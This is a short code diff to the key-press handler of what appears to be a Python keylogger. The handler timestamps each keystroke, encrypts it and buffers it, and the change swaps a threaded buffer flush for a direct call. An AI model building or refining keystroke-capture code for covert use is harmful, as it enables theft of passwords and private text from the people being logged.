@@ -88,12 +88,12 @@ def on_press(key):
             text = f"{time_str} - {key.char}"
         else:
             text = f"{time_str} - [{key.name}]"
-        print(text)
+        print(text)  
         encrypted = fernet.encrypt(text.encode())
         with buffer_lock:
             buffer.append(encrypted)
             if len(buffer) >= BUFFER_SIZE:
-                threading.Thread(target=flush_buffer_safe).start()
+                flush_buffer()
     except Exception as e:
         logging.error(f"Error in on_press: {e}")
 
